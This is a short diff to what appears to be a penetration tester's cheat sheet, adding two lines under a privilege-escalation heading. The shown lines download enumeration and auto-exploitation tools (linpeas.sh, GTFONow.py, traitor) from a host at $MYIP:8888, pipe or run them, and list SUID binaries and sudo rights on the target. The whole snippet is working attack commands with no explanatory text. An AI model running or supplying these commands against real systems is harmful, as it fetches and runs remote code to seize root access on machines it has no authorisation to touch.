@@ -676,6 +676,8 @@ python3 -m http.server 8888 -d ~/Upload
 [*] Privilege Escalation
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | bash
 curl http://$MYIP:8888/linux/linpeas.sh | bash
+c=./GTFONow.py;curl $MYIP:8888/linux/$c -O;chmod +x $c;python3 $c -a
+c=./traitor;curl $MYIP:8888/linux/$c -O;chmod +x $c;$c -a
 
 find / -perm /4000 2>/dev/null | xargs ls -la
 sudo -l
